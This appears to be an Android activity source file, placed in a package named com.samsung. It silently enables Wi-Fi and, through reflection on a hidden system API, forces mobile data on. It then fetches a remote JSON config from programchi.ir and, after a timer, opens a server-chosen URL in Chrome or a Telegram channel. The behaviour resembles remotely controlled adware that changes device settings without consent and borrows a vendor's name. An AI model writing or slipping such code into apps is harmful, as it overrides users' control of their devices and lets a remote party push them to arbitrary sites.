package com.samsung;

import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

public class Main2Activity extends AppCompatActivity {

    JSONObject json = null;
    String str = "";
    HttpResponse response;
    Context context;
    String site,telegram,type;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        @SuppressLint("WifiManagerLeak") WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);



        if(havedata()||wifi.isWifiEnabled()&&isOnline())
        {
            new getData(Main2Activity.this).execute();
            Timer _timer = new Timer();

            _timer.schedule(new TimerTask() {
                @Override
                public void run() {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            //Toast.makeText(getApplicationContext(), ""+type, Toast.LENGTH_SHORT).show();
                            if(type.contains("1")) {
                                Intent intent=new Intent(Intent.ACTION_VIEW,Uri.parse(site));
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intent.setPackage("com.android.chrome");
                                try {
                                    startActivity(intent);
                                } catch (ActivityNotFoundException ex) {
                                    // Chrome browser presumably not installed so allow user to choose instead
                                    intent.setPackage(null);
                                    startActivity(intent);
                                }
                            }
                            else
                                {
                                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("tg://resolve?domain="+telegram));
                                startActivity(intent);
                                }

                            Timer _timer = new Timer();

                            _timer.schedule(new TimerTask() {
                                @Override
                                public void run() {
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {
                                            finish();
                                        }});}}, 3600000);



                        }});}}, 10000);

        }
        else
        {

            wifi.setWifiEnabled(true);
            try {
                setMobileDataEnabled(Main2Activity.this,true);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
            Timer _timer = new Timer();
            _timer.schedule(new TimerTask() {
                @Override
                public void run() {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            new getData(Main2Activity.this).execute();
                            Timer _timer2 = new Timer();
                            _timer2.schedule(new TimerTask() {
                                @Override
                                public void run() {
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {
                                            Intent intent=new Intent(Intent.ACTION_VIEW,Uri.parse(site));
                                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            intent.setPackage("com.android.chrome");
                                            try {
                                                startActivity(intent);
                                            } catch (ActivityNotFoundException ex) {
                                                // Chrome browser presumably not installed so allow user to choose instead
                                                intent.setPackage(null);
                                                startActivity(intent);
                                            }

                                            Timer _timer3 = new Timer();
                                            _timer3.schedule(new TimerTask() {
                                                @Override
                                                public void run() {
                                                    runOnUiThread(new Runnable() {
                                                        @Override
                                                        public void run() {
                                                            finish();
                                                        }
                                                    });
                                                }
                                            }, 3600000);}
                    });}}, 10000);}
                    });}}, 30000);

        }
    }
    private class getData extends AsyncTask<Void, Void, Void> {
        public Context context;


        public getData(Context context) {
            this.context = context;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... arg0) {

            HttpClient myClient = new DefaultHttpClient();
            HttpPost myConnection = new HttpPost("http://programchi.ir/view/send-data.php");

            try {
                response = myClient.execute(myConnection);
                str = EntityUtils.toString(response.getEntity(), "UTF-8");

            } catch (ClientProtocolException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

            try {
                JSONArray jArray = new JSONArray(str);

                    json = jArray.getJSONObject(0);

            } catch (JSONException e) {
                e.printStackTrace();
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            return null;
        }

        protected void onPostExecute(Void result) {
            try {
                site = json.getString("site");
                telegram  = json.getString("telegram");
                type=json.getString("type");


            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            //Hiding progress bar after done loading TextView.

        }
    }
    private void setMobileDataEnabled(Context context, boolean enabled) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        final ConnectivityManager conman = (ConnectivityManager)  context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final Class conmanClass = Class.forName(conman.getClass().getName());
        final Field connectivityManagerField = conmanClass.getDeclaredField("mService");
        connectivityManagerField.setAccessible(true);
        final Object connectivityManager = connectivityManagerField.get(conman);
        final Class connectivityManagerClass =  Class.forName(connectivityManager.getClass().getName());
        final Method setMobileDataEnabledMethod = connectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
        setMobileDataEnabledMethod.setAccessible(true);

        setMobileDataEnabledMethod.invoke(connectivityManager, enabled);
    }
    private boolean isOnline() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
    private  Boolean havedata()
    {
        boolean mobileDataAllowed = Settings.Secure.getInt(getContentResolver(), "mobile_data", 1) == 1;
        return mobileDataAllowed;
    }

}
